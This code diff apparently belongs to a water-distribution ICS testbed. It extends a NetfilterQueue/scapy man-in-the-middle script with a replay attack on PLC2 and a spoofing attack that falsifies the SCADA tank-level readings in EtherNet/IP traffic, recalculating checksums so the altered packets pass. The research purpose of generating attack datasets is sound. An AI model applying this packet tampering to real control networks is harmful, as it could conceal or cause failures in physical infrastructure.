@@ -12,25 +12,45 @@ import sqlite3
 # connection to the database
 conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
 c = conn.cursor()
-
+iteration = 0
 enip_port = 44818
-
 sniffed_packet = []
+
+# The attack on PLC2 is a replay attack
 injection_phase = 0
+
+# The attack on SCADA is an integrity attack on T_LVL
+spoof_phase = 0
+spoof_counter = 0
+
+spoof_attack_counter = 0
+
 nfqueue = NetfilterQueue()
 
 def sniff(value):
+
     print ("In sniff------------")
     sniffed_packet.append(value)
-    c.execute("UPDATE minitown SET value = 2 WHERE name = 'ATT_1'")
+    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
     conn.commit()
-    if len(sniffed_packet) == 100:
+
+    if len(sniffed_packet) == 60:
         global injection_phase
         injection_phase = 1
 
+def spoof(raw):
+    print("Spoofing-----------")
+    float_value = translate_load_to_float(raw)*0.01
+    fake_value = float_value
+    c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
+    conn.commit()
+    pay = translate_float_to_load(fake_value, raw[0], raw[1])
+    return pay
+
 def injection(raw):
     print ("In injection-----------")
-    fake_value = sniffed_packet[0]
+    float_value = translate_load_to_float(raw)
+    fake_value = sniffed_packet[0] + float_value
     sniffed_packet.pop(0)
     c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
@@ -44,18 +64,47 @@ def capture(packet):
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
         float_value = translate_load_to_float(raw)
 
-        if not injection_phase:
-            sniff(float_value)
-        else:
-            try:
-                pay = injection(raw)
+        if sys.argv[1] == 'plc2':
+            if not injection_phase:
+                sniff(float_value)
+            else:
+                try:
+                    pay = injection(raw)
+                    pkt[Raw].load = pay  # This is an IP packet
+                    del pkt[TCP].chksum  # Needed to recalculate the checksum
+                    packet.set_payload(str(pkt))
+
+                except IndexError:
+                    print("sniffed packets finished")
+                    __setdown(enip_port)
+                    return 0
+
+        elif sys.argv[1] == 'scada':
+            # Get T_LVL if its below 0.5 and t<500, spoof (t is inferred from the launch time and the approximate time physical process gets to t=500)
+            global spoof_counter
+            spoof_counter += 1
+            print ("spoof counter %d" % spoof_counter)
+            float_value = translate_load_to_float(raw)
+            if float_value <= 0.5 and spoof_counter <=240:
+                global spoof_phase
+                spoof_phase = 1
+
+            if spoof_phase == 1:
+                global spoof_attack_counter
+                spoof_attack_counter += 1
+                pay = spoof(raw)
                 pkt[Raw].load = pay  # This is an IP packet
                 del pkt[TCP].chksum  # Needed to recalculate the checksum
                 packet.set_payload(str(pkt))
-            except IndexError:
-                print("sniffed packets finished")
-                __setdown(enip_port)
-                return 0
+
+                if spoof_attack_counter > 60:
+                    print("Attack finished")
+                    global spoof_phase
+                    spoof_phase = 0
+                    __setdown(enip_port)
+                    return 0
+
+
     packet.accept()
 
 
@@ -75,8 +124,6 @@ def translate_float_to_load(fv, header0, header1):
 def start():
     __setup(enip_port)
     nfqueue.bind(0, capture)
-    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
-    conn.commit()
     try:
         print("[*] starting water level spoofing")
         nfqueue.run()
